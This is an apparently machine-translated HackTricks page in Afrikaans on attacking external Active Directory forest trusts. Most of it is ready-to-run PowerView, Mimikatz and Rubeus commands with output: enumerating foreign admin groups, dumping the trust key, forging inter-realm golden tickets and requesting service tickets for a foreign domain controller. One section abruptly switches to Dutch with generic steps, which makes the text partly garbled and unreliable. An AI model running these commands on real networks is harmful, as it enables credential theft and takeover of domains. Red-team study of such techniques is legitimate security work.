# Eksterne Bosdomein - Eenrigting (Inkomend) of bidirectioneel

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

In hierdie scenario vertrou 'n eksterne domein jou (of vertrou hulle mekaar), sodat jy 'n sekere mate van toegang daartoe kan kry.

## Enumerasie

Eerstens moet jy die vertroue **enumereer**:
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
In die vorige opname is gevind dat die gebruiker **`crossuser`** binne die **`External Admins`** groep is wat **Admin-toegang** het binne die **DC van die eksterne domein**.

## Aanvanklike Toegang

As jy nie enige **spesiale** toegang van jou gebruiker in die ander domein kon vind nie, kan jy steeds teruggaan na die AD Metodologie en probeer om **privesc van 'n onbevoorregte gebruiker** te doen (dinge soos kerberoasting byvoorbeeld):

Jy kan **Powerview funksies** gebruik om die **ander domein** te **opname** deur die `-Domain` parameter te gebruik soos in:
```powershell
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Impersonasie

### Aanteken

Deur 'n gewone metode te gebruik met die legitimasie van die gebruikers wat toegang het tot die eksterne domein, behoort jy toegang te hê tot:
```powershell
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID Geskiedenis Misbruik

Jy kan ook [**SID Geskiedenis**](sid-history-injection.md) misbruik maak oor 'n bos vertroue.

As 'n gebruiker **van die een bos na die ander** gemigreer word en **SID Filtering nie geaktiveer is nie**, word dit moontlik om 'n **SID van die ander bos by te voeg**, en hierdie **SID** sal by die **gebruiker se token** gevoeg word wanneer hy oor die vertroue **geauthentiseer** word.

{% hint style="warning" %}
As 'n herinnering, kan jy die ondertekening sleutel kry met
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
```
{% endhint %}

Jy kan die **vertroude** sleutel gebruik om 'n **TGT te onderteken** wat die gebruiker van die huidige domein naboots.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Volledige manier om die gebruiker te impersonate

Hier is een volledige methode om de gebruiker te impersoneren. 

1. Verkrijg de gebruikersnaam en het wachtwoord van de doelgebruiker. Dit kan worden gedaan door middel van social engineering, phishing of het kraken van zwakke wachtwoorden.

2. Verkrijg toegang tot een systeem binnen het externe bosdomein waarin de doelgebruiker zich bevindt. Dit kan worden bereikt door het uitbuiten van kwetsbaarheden in de beveiliging of door het verkrijgen van legitieme toegangsreferenties.

3. Verhoog de privileges van de verkregen toegang tot het systeem. Dit kan worden gedaan door het uitvoeren van privilege-escalatie-exploits of door het verkrijgen van beheerdersreferenties.

4. Gebruik de verkregen privileges om de gebruiker te impersoneren. Dit kan worden gedaan door het wijzigen van de gebruikerscontext of door het gebruik van tools zoals "runas" om opdrachten uit te voeren als de doelgebruiker.

Het is belangrijk op te merken dat het impersoneren van een gebruiker zonder hun toestemming illegaal is en ernstige juridische gevolgen kan hebben. Deze informatie is alleen bedoeld voor educatieve doeleinden en mag niet worden misbruikt.
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
